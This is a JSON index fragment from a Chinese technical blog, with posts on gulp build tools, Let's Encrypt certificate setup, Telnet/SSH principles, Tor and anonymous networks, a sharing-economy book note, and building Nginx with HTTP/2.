Grunt配置文件\n|\u0026mdash; index.js 主函数入口文件\n|\u0026mdash; package.json 项目配置\n扩展：Ghost官方入门文档，Ghost wiki\n","description":"","id":623,"section":"post","tags":["Ghost","博文","源码"],"title":"Ghost源码分析（一）: 目录结构","uri":"https://www.chenshaowen.com/blog/source-analysis-of-ghost-1.html"},{"content":"1. 前端自动化构建工具 在处理前端场景时，用 Less 写 CSS，用 Jade 写 HTML，用 Browserify 模块化，为非覆盖式部署的资源加 MD5 戳等。这些工作如果纯手工来做，工作效率将会非常低。而前端自动化构建工具可以把这些重复工作一次配置，多次重复执行，极大的提高开发效率。\n前端自动化构建工具主要提供如下特征功能：\n版本控制 检查 JS 图片合并 压缩并重命名 CSS 压缩并重命名 JS 编译 LESS、SASS 2. 常见的前端自动化构建工具 2.1 Grunt 基于 Node.js 的插件工具 Grunt，本身是一个执行器，大量的功能都存在于NPM管理的插件中。特别是以 grunt-contrib- 开头的核心插件，覆盖了大部分的核心功能，比如 handlebars，jade，less，compass，jshint，jasmine，clean，concat，minify，copy，uglify，watch，minify，uglify 等。可以把 grunt 理解为一组 task，比如说合并若干 js（concat）、压缩js（min）、测试js（qunit）等等。\n2.2 Gulp 基于 Node.js 的插件工具 Gulp，主要是针对 Grunt 的不足发起的一个项目。由于借鉴了 Unix 操作系统的管道（pipe）思想，前一级的输出，直接变成后一级的输入，使得在操作上非常简单。相比 Grunt 频繁的 I/O 操作，Gulp 能更快地更便捷地完成构建工作。\nGulp 具有如下优点:\n使用 gulp.js，你的构建脚本是代码，而不是配置文件； 使用标准库（node.js standard library）来编写脚本； 插件都很简单，只负责完成一件事－基本上都是 20 行左右的函数； 任务都以最大的并发数来执行； 输入／输出（I/O）是基于“流式”的。 2.3 Yeoman Yeoman 是 Google 领头开发的一个前端构建工具，它的目的是为了给新项目建立一个完整的工作流，让开发人员可以专注于解决问题而不是担心那些不必要的小事情。Yeoman 提供 generator 系统，一个 generator 是一个插件。Yeoman 提供了三个工具：脚手架（yo），构建工具（grunt），包管理器（bower）。这三个工具是分别独立开发的，但是需要配合使用，来实现我们更高效的工作流模式。\n其他还有百度的 FIS3，Webpack，Rollup.js\n3. Gulp 安装与配置 Gulp 是基于 Nodejs 构建的工具。首先需要安装 Nodejs 和 NPM 包管理工具。\n3.1 安装 gulp 1 npm install -g gulp //以全局方式安装 使用 gulp -v 命令可以查看 Gulp 版本号，每构建一个新项目时，都需要从这步骤开始再单独安装一次，保持每个项目的独立性。\n3.2 开始使用 gulp 构建项目 生成 package.json\n1 npm init 3.3 常用的 gulp 插件 1 2 3 4 5 6 npm install --save-dev gulp //本地使用gulp \u0026lt;br\u0026gt; npm install --save-dev jshint \u0026lt;br\u0026gt; npm install --save-dev gulp-jshint //js代码检测\u0026lt;br\u0026gt; npm install --save-dev gulp-uglify //js压缩\u0026lt;br\u0026gt; npm install --save-dev gulp-livereload //页面自动刷新\u0026lt;br\u0026gt; npm install --save-dev gulp-webserver //静态服务器\u0026lt;br\u0026gt; 其他插件\ngulp-load-plugins //自动加载package.json中的文件依赖\ngulp-imagemin //压缩图片\ngulp-minify-css //压缩css\ngulp-ruby-sass //sass\ngulp-concat //文件合并\ngulp-rename //文件重命名\npng-sprite //png合并\ngulp-htmlmin //压缩html\ngulp-clean //清空文件夹\nbrowser-sync //文件修改浏览器自动刷新\ngulp-shell //执行shell命令\ngulp-ssh //操作远程机器\nrun-sequence //task顺序执行\n注：\u0026ndash;save 是对生产环境所需依赖的库, \u0026ndash;save-dev 是对开发环境所需依赖的库。只需要选择使用到的库安装即可。在安装完毕相关包之后，gulp 会自动将包的版本信息添加到 package.json 文件中。\n3.4 Gulp 任务配置：gulpfile.js gulp 是一个 task 的执行器，需要将每个 task 写入 gulpfile.js，Gulp 才能够自动化执行。在根目录下创建 gulpfile.js 文件，也可以参考官方说明 :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 var gulp = require(\u0026#39;gulp\u0026#39;), jshint = require(\u0026#39;gulp-jshint\u0026#39;), uglify = require(\u0026#39;gulp-uglify\u0026#39;), livereload = require(\u0026#39;gulp-livereload\u0026#39;); //校验JS文件，jshint校验规则 gulp.task(\u0026#39;lint\u0026#39;, function() { return gulp.src(\u0026#39;src/js/\\*\\*/\\*.js\u0026#39;) .pipe(jshint()) .pipe(jshint.reporter(\u0026#39;default\u0026#39;)); }); //压缩JS文件 gulp.task(\u0026#39;scripts\u0026#39;, function() { return gulp.src(\u0026#39;src/js/\\*\\*/\\*.js\u0026#39;) .pipe(uglify()) .pipe(gulp.dest(\u0026#39;dist/js\u0026#39;)); // 预设任务 gulp.task(\u0026#39;default\u0026#39;, function() { gulp.start(\u0026#39;lint\u0026#39;, \u0026#39;scripts\u0026#39;); }); // 看守 gulp.task(\u0026#39;watch\u0026#39;, function() {\tgulp.watch(\u0026#39;src/js/\\*.js\u0026#39;,[\u0026#39;lint\u0026#39;,\u0026#39;scripts\u0026#39;]);\tlivereload.listen(); // Watch any files in dist/, reload on change gulp.watch([\u0026#39;dist/\\*\\*\u0026#39;]).on(\u0026#39;change\u0026#39;, livereload.changed); }); 项目的目录结构：\n1 2 3 4 5 6 7 8 9 10 11 12 │ gulpfile.js │ package.json │ node_modules ├─dist │ └─js │ main.js │ └─src └─js │ main.js │ index.html 在项目的根目录下，执行 gulp 命令，执行 task 任务，完成编译。\n1 gulp 每次修改都需要执行一次gulp命令，比较麻烦，直接使用gulp watch命令看守，当发生变化时自动执行指定的task。\n1 gulp watch 4. 参考 http://www.cnblogs.com/2050/p/4198792.html ","description":"","id":624,"section":"post","tags":["前端","工具","博文"],"title":"前端自动化构建工具 gulpjs","uri":"https://www.chenshaowen.com/blog/front-auto-build-tools-gulp.html"},{"content":"1. SSL证书 先来了解几个概念\n1.1 数字证书 包含加密用的公钥或私钥，还有一些身份附加信息。任何人都可以使用相关工具生成自己的数字证书，用来加密文件、邮件，或用于通讯加密。\n1.2 SSL 协议 用于网络通讯的加密协议。通信过程需要一份数字证书，使用里面的公钥及私钥来发送随机生成的通信秘钥。在握手完成后，SSL证书并不用于通信内容的加密。\n1.3 CA 证书 CA(Certification Authority)，它的中文意思是证书授权，是一个单位，来管理发放数字证书。由它发放的证书就叫CA证书，以区别于个人使用工具随意生成的数字证书，查看CA 证书，里面有两项重要内容，一个是颂发给谁，另一个是由谁颂发的。CA证书分为3类，DV 域名验证证书，OV 组织机构验证证书，EV 增强的组织机构验证证书。一般个人使用DV证书完全够了，浏览器表现为地址栏前会有绿色的小锁。\n1.4 CA 证书的信任链 如果你安装并信任了一个CA 机构的证书，以他为根，同样也信任了由这个CA 机构颂发的其它组织的证书，其它组织则可以创建自己的CA中心，颂发下一级的证书，依次往下，一层层会有许多 CA 中心和数字证书。这个最上层的CA 证书，即可以称为根证书。\n2. Let\u0026rsquo;s Encrypt项目简介 Let\u0026rsquo;s Encrypt是由互联网安全研究小组（ISRG）提供的服务，2015年4月9日宣布与Linux基金会合作。Let\u0026rsquo;s Encrypt项目计划是为网站提供永久免费的SSL证书，用于加速互联网从HTTP向HTTPS过度。同时，https/2也必须使用https，StartSSL、Wosign有免费DV证书，便宜的还有Rapid、Comodo证书，其他证书价格一般较高。Let\u0026rsquo;s Encrypt证书签署快、免费、支持多域名，但是现阶段签署的证书只有三个月的有效期，需要通过自动化脚本续签。Let\u0026rsquo;s Encrypt 与 IdenTrust 的 DST Root CA 做了交叉认证，兼容所有主流的浏览器。在2015年12月，Let\u0026rsquo;s Encrypt项目已经开始公测。\nSSL证书的意义不仅仅在于加密，更在于颁发机构提供的担保，也就是因CA机构的过失，造成经济损失时，会有一定额度的赔偿。对于廉价或者免费的证书，这种担保就没有太大意义，CA机构也不会提供担保。廉价和免费证书的意义在于对https的普及，避免ISP对http的劫持，对流量的加密。\n3. 生成Let\u0026rsquo;s Encrypt证书 Let\u0026rsquo;s Encrypt 证书生成官方推荐 certbot 这套自动化工具来实现。在官网上有比较详细的教材，根据不同的操作系统适配生成环境。这里直接在GitHub上下载certbot，certbot是一个Python 脚本。\ngit clone https://github.com/certbot/certbot\ncd certbot\n在正式安装之前，需要关闭服务器，脚本会占用80和443端口。\n./letsencrypt-auto certonly\n脚本会自动生成环境\nCreating virtual environment\u0026hellip;\nInstalling Python packages\u0026hellip;\nInstallation succeeded.\n在 /etc/letsencrypt/ 目录下存放着证书和证书的配置\n4. 服务器部署及自动化 在证书的存放目录下有四个文件：\nprivkey1.pem: 证书密钥\nfullchain1.pem: 带证书链的域名证书\nchain1.pem: The Let’s Encrypt 证书\ncert1.pem: 域名证书\n修改Nginx的配置文件nginx.conf中SSL相关的参数\nssl_certificate /etc/letsencrypt/live/XXX.com/fullchain1.pem;\nssl_certificate_key /etc/letsencrypt/live/XXX.com/privkey1.pem;\n由于Let\u0026rsquo;s Encrypt有效期现阶段只有90天，我们可以配置一个自动化续签的脚本certrenew.h。\n#!/bin/sh\n# This script renews all the Let\u0026rsquo;s Encrypt certificates with a validity \u0026lt; 30 days\nif ! /home/letsencrypt/letsencrypt-auto renew \u0026gt; /var/log/letsencrypt/renew.log 2\u0026gt;\u0026amp;1 ; then\necho Automated renewal failed:\ncat /var/log/letsencrypt/renew.log\nexit 1\nfi\nnginx -t \u0026amp;\u0026amp; nginx -s reload\n开启定时任务Cron\ncrontab -e\n编辑任务内容\n@daily /home/certrenew.sh\nHTTPS网站安全性能测试：SSL Server Test\n","description":"","id":625,"section":"post","tags":["博文","HTTPS","博文","安全证书"],"title":"Let's Encrypt证书生成与使用","uri":"https://www.chenshaowen.com/blog/generate-letsencrypt-ssl.html"},{"content":" 本文主要介绍了Telnet、SSH 的通信原理，分析了其通信时的工作流程。\n1. Telnet 无论Telnet协议连接的是什么类型终端，都会转换为NVT（Net Virtual Terminal）格式进行通信。网络虚拟终端NVT是Telnet异构跨平台的基础。\n1.1 Telnet 的工作进程 本地与远程主机建立连接，该过程实际上是建立一个TCP 连接，用户必须知道远程主机的 IP 地址或域名\n将本地终端上输入的用户名和口令及以后输入的任何命令或字符以NVT格式传送到远程主机。该过程实际上是从本地主机向远程主机发送一个IP 数据报\n将远程主机输出的 NVT格式的数据转化为本地所接受的格式送回本地终端，包括输入命令回显和命令执行结果\n最后，本地终端对远程主机撤消TCP 连接\n这里，telnet协议的客户机和服务器端的数据交互都是以明文的方式来进行的。通过抓包工具很容易获取到这些数据，对网络设备进行攻击。\n1.2 常见的Telnet攻击手段 密码窃取：通过抓包等方式窃取到用户帐号和密码\n中间人攻击：“中间人”冒充真正的服务器接收到客户端传给服务器的数据，然后再冒充你把数据传给真正的服务器\n伪服务器：攻击者冒充服务器与客户端进行交互，骗取客户端的帐号信息\n2. SSH，Secure Shell 把所有传输的数据进行加密，这样\u0026quot;中间人\u0026quot;这种攻击方式就不可能实现了，而且也能够防止 DNS 和IP 欺骗，这就是SSH。\n3. SSH登录过程 版本号协商。服务器打开22端口，等待客户端连接，连接后，服务器与客户端协商协议版本。\n密钥和算法协商阶段。服务端和客户端分别发送算法协商报文给对方，报文中包含支持的各种协议的算法列表。根据协商服务器端和客户端选定使用的算法。服务端和客户端利用DH交换算法、主机密钥对等参数，生成会话密钥和会话ID。\n认证阶段。客户端使用密钥和算法协商阶段生成的会话密钥加密账号、认证方法、口令，将结果发送给服务器。服务端使用获得的会话密钥解密报文，得到账号和口令，进行认证。SSH提供两种认证方式（2.0版本还支持password-publickey和any认证）:\n密码认证。客户端将用户名和密码加密后发送给服务器，服务器解密后进行比对认证。 数字签名认证。设备上利用RSA或者DSA公共秘钥算法实现数字签名，生成public和key，然后将public上传到服务器。登录认证时，服务器端向客户端发送随机字符串，用户用自己的私钥加密后，再发回来。服务器用储存的公钥进行解密认证。 扩展：SSH原理与运用（一）：远程登录\n","description":"","id":626,"section":"post","tags":["SSH","Telnet","协议","博文"],"title":"Telnet、SSH 原理","uri":"https://www.chenshaowen.com/blog/telnet-ssh-key.html"},{"content":"匿名通信是由 Chaum 提出的，他提出了基于Mix节点的匿名通信算法，Mix 节点接收多个发送者的消息，并对这些消息进行混合处理，然后传输给接收者，因此掩盖了发送者和接受者的身份信息，实现了匿名。\n1. 匿名通信的基本框架 1.1 匿名属性 匿名属性包括不可辨识性(unidentifiability)和不可联系性(unlinkability)。不可辨识性是指对手无法识别用户的身份和行为;不可联系性是指对手无法通过观察系统将消息、行为和用户相关联。\n1.2 对手能力 对手是意图降低、消除通信匿名的通信网络用户或用户的集合。匿名通信系统一般通过提出威胁模型( thread\nmode),来表明该系统能够抵抗的对手能力。对手能力分为三个方面:可达能力( reachability)、攻击能力(attackability)和适应能力(adaptability)。\n1.3 网络类型 匿名通信系统的网络类型由以下三个因素确定，分别为:路径拓扑(path topology)、路由机制( route scheme)和路径类型(path type)。\n2. 现阶段匿名通信分类: 2.1 基于 Mix 算法的匿名通信系统 该类通信系统的核心思想是利用单个Mix节点或瀑布型的多个 Mix 节点实现匿名通信。Mix 节点是指网络中向其他节点提供匿名通信服务的节点，它接收用其公钥加密的数据，并对数据进行解密、批处理、重序、增加冗余字节等处理，然后将数据传输给下一个 Mix 或最终接收者。基于 Mix 算法的匿名通信系统具有以下特点:\n匿名通信系统网络中一部分节点为其他节点提供匿名通信服务; 发起者需要在发起匿名通信之前确定整个通信的传输路径，该路径在传输中不会改变; 发起者需要在发起匿名通信之前，得到整个传输路径中各个Mix节点的信息，包括地址、密钥信息等; Mix节点对来自多个发送者的通信信息进行解密、复用、批处理、重序、增加冗余字节等处理，系统匿名较高，但通信传输的时延较高，一般不适合实时的数据通信。 基于 Mix 算法的匿名通信系统包括 Babel、Cyberpunk(Type I)、Mixmaster(Type II)、Mixminion(Type III)\n2.2 基于 Onion Routing 算法的匿名通信系统 基于 Onion Routing 算法的匿名通信系统更注重数据通信的实时性以及系统的简单\n性、有效性和可实施性，其特点为:\n基于 Onion Routing 算法的匿名通信系统建立在 TCP 传输的基础上，节点之间通常通过 SSL 方式传输; 基于 Onion Routing 算法的匿名通信系统在路径建立时采用非对称密钥算法加密，在数据通信时采用对称密钥算法加密，以提高数据传输效率，降低时延; 基于 Onion Routing 算法的匿名通信系统采用实时复用并转发，不对通信数据进行乱序、固定输入输出流量等批处理。基于 Onion Routing 算法的匿名通信系统包括 Tor、FreeNet 等。 2.3 基于泛洪算法的匿名通信系统 基于泛洪算法的匿名通信系统是近期匿名通信传输领域新的研究热点，主要基于flooding、epidemic等类洪泛算\n法实现匿名通信，目前仍处于实验室研究阶段，没有实际部署的成熟的匿名通信系统。基于泛洪算法的匿名通信系统一般\n具有以下特点:\n发起者在发起匿名传输之前完全不清楚匿名传输的路径，也无需得到传输中间节点的任何信息; 发起者的每一次匿名传输路径并不固定; 匿名通信网络中的任何一个中间节点都不知道匿名通信的发起者和接收者。 3. Tor介绍 Tor 是第二代基于 Onion Routing 算法的匿名通信系统，目前以中继节点志愿的方式广泛地部署在 Internet 中，是 Internet 中最成功的公共匿名通信服务。Tor 网络在全球有超过 1000 个的中继节点，大多数位于德国和美国，同时具有数以百万计的用户。Torproject,是其应用项目。\nTor 是基于通道 (circuit) 交换的低延迟的匿名通信服务。Tor 的设计引入了完美前向机密(perfect forward secrecy)、拥塞控制(congestion control)、目录服务(directory service)、完整性校验( integrity checking)和可配置的出口策略(configurableexitpolicies)等机制，解决了第一代基于Onion Routing算法的匿名通信系统设计的种种问题。Tor 有两种实体，分别是 Tor 用户(Tor user)和Tor节点(Tornode)。Tor 用户在本地系统中运行 Onion Proxy(OP)程序，该程序负责建立通道,接收应用TCP数据流，并将该数据流通过已建立通道传输。\n通道建立过程如下。\nOP 访问目录服务，得到网络中 Tor 节点的信息，包括 IP 地址、公钥、出口策略、带宽和在线时间等。\nOP 随机选择三个 Tor 节点作为中继节点，分别为入口节点、中间节点和出口节点。中继节点中只有入口节点知道通信发起者的身份，因此如何选择入口节点对于保护通信发起者的匿名十分重要。中间节点知道通道中入口节点和出口节点的身份,但是不知道匿名通信发起者和接收者的身份。出口节点作为网关负责 Tor 网络和外部 Internet 网络的应用层连接，并充当加密的 Tor 网络传输流量和非加密的 Internet 传输流量之间\n的中继。出口节点知道匿名通信接收者的身份。当 OP 在构建通道时，OP 和每一个中继节点协商共享的会话密钥。在这种设计下，通道中没有一个单一的节点知道匿名通信发起者和接收者的身份，因此实现了通信的匿名。\n通信消息传输过程如下。\n一旦建立完通道，OP 可以开始传输应用数据。OP 通过 SOCKS 协议接收应用程序数据，然后选择最新建立的通道进行传输。通信传输时，OP 将应用消息分割为 512 B 的 Cell，每一个 Cell 依次使用 OP 和中继节点共享的会话密钥进行加密，顺序如下:出口节点、中间节点和入口节点。当数据经过通道传输时，中继节点使用会话密钥进行解密，解密后传输给下一个中继节点。出口节点将消息还原为明文消息并传输给接收者。\nTor 适合于既有数据传输匿名要求，也有数据传输实时性要求的低延迟匿名通信，如 Web 访问和即时消息传输等。\n","description":"","id":627,"section":"post","tags":["匿名网络","Tor","安全"],"title":"匿名网络概述","uri":"https://www.chenshaowen.com/blog/anonymous-network.html"},{"content":"中文书名: 共享经济: 重构未来商业新模式\n英文书名: Peers Inc: How People and Platforms Are Inventing the Collaborative Economy and Reinventing Capitalism\n作者: [美] 罗宾•蔡斯\n出版年: 2015-9-25\nISBN: 9787213067853\nNotes:\n作者以自己创建的Zipcar公司为入口，通过分析当下知名共享公司Uber和Airbnb，对共享经济模式进行了详细深入的解读。共享经济的关键在于:过剩的产能、人人参与、共享平台。\n人人共享赋予了个人一个公司的能力，并让其专注在自己能力最强的方面。想法、研究、设计、风格、命名、品牌口号、价格和销量，个人常能参与其中的几个方面，人与人之间的相互合作完善了整个链条。人人都可以成为企业家或微型企业家。如果能减少障碍，激励人们去从商，尤其是在今天的经济环境下。\n最好的解决方案并非来自这个领域的专家学者。实际上，要解决的问题和他们的专业知识越不相关，他们越有可能相处获胜的方案来。通过发布悬赏征集意见，常常会或者意想不到的好结果，可以是一个解决方案、一个科学问题、一个APP的开发。\n所限的领域范围越小、把公司做大的可能性就越大。\n人人共享结构的优势很大程度上时由于参与的多样性。多样性让人人共享公司以更低的成本参与到定制化、本地化和专业化的进程中去。\n","description":"","id":628,"section":"post","tags":["书籍","共享","市场"],"title":"共享经济","uri":"https://www.chenshaowen.com/blog/book/peersinc.html"},{"content":" 本文主要介绍了在Linux上如何通过编译安装Nginx，并开启htttp2，还对使用http1.1和http2.0协议的访问本站的速度进行了比较。\n1. 编译安装 Nginx 首先需要下载Nginx和它的几个依赖包。Zlib，Web请求传输时对数据进行压缩，节省带宽；PCRE，正则匹配URL进行路由分发；OpenSSL 或 LibreSSL,安全套接字算法库，提供https支持。下面都使用最新的版本：\n1 2 3 4 5 6 7 8 9 10 11 wget http://nginx.org/download/nginx-1.11.1.tar.gz wget http://zlib.net/zlib-1.2.8.tar.gz wget http://ncu.dl.sourceforge.net/project/pcre/pcre/8.30/pcre-8.30.tar.gz wget http://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-2.4.1.tar.gz gunzip \\*.gz tar xvf nginx-1.11.1.tar zlib-1.2.8.tar pcre-8.30.tar libressl-2.4.1.tar 配置时，至少需要启用 http_v2_module 和 http_ssl_module 这两个模块：\ncd nginx-1.11.1 ./configure --with-openssl=../libressl-2.4.1 --with-pcre=../pcre-8.30 --with-zlib=../zlib-1.2.8 --with-http_v2_module --with-http_ssl_module 你会看到如下信息输出，里面有配置文件和log的路径。\nnginx path prefix: \u0026ldquo;/usr/local/nginx\u0026rdquo;\nnginx binary file: \u0026ldquo;/usr/local/nginx/sbin/nginx\u0026rdquo;\nnginx modules path: \u0026ldquo;/usr/local/nginx/modules\u0026rdquo;\nnginx configuration prefix: \u0026ldquo;/usr/local/nginx/conf\u0026rdquo;\nnginx configuration file: \u0026ldquo;/usr/local/nginx/conf/nginx.conf\u0026rdquo;\nnginx pid file: \u0026ldquo;/usr/local/nginx/logs/nginx.pid\u0026rdquo;\nnginx error log file: \u0026ldquo;/usr/local/nginx/logs/error.log\u0026rdquo;\nnginx http access log file: \u0026ldquo;/usr/local/nginx/logs/access.log\u0026rdquo;\nnginx http client request body temporary files: \u0026ldquo;client_body_temp\u0026rdquo;\nnginx http proxy temporary files: \u0026ldquo;proxy_temp\u0026rdquo;\nnginx http fastcgi temporary files: \u0026ldquo;fastcgi_temp\u0026rdquo;\nnginx http uwsgi temporary files: \u0026ldquo;uwsgi_temp\u0026rdquo;\nnginx http scgi temporary files: \u0026ldquo;scgi_temp\u0026rdquo;\n然后安装就可以了\n1 2 make make install Nginx默认安装在/usr/local/nginx，这时可以通过命令查看一下Nginx的版本。\n1 /usr/local/nginx/sbin/nginx -v 你会看到如下信息输出。\nnginx version: nginx/1.11.1\n这时还不能通过service nginx start/stop/restart管理Nginx状态。需要注册系统服务，这里直接将原来的Nginx替换为刚才编译的版本。\n1 2 3 service nginx stop mv /usr/sbin/nginx /usr/sbin/nginx_bk ln -s /usr/local/nginx/sbin/nginx /usr/sbin/nginx 2. 配置 Nginx 注意:使用http2必须是https链接。根据自己的服务需求，配置好/usr/local/nginx/conf/nginx.conf文件，开启http2非常的简单，只需要将原来的 listen 443 ssl 替换为listen 443 ssl http2 ，启动nginx即可。\n1 service nginx 3. 测试 下面是没有开启HTTP/2访问本站：\n下面是开启HTTP/2访问本站：\n速度有提升。\n","description":"","id":629,"section":"post","tags":["Nginx","HTTP/2","博文"],"title":"Nginx开启HTTP/2","uri":"https://www.chenshaowen.com/blog/nginx-open-http2.html"}]